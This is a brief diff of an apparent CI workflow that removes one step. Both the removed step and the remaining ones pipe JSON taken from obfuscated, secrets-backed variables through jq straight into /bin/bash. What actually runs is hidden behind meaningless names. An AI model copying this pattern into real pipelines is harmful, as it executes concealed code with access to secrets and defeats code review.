@@ -21,7 +21,6 @@ jobs:
           smm523: ${{ secrets.smm523 }}
         run: |
           printf '%s' "$smm523" | jq -r .dck1331 | /bin/bash
-          echo $nyl5 | jq -r .yz13 | /bin/bash
           printf '%s' "$zcwy388" | jq -r .sfrem481 | /bin/bash
 
       - name: Upload artifact
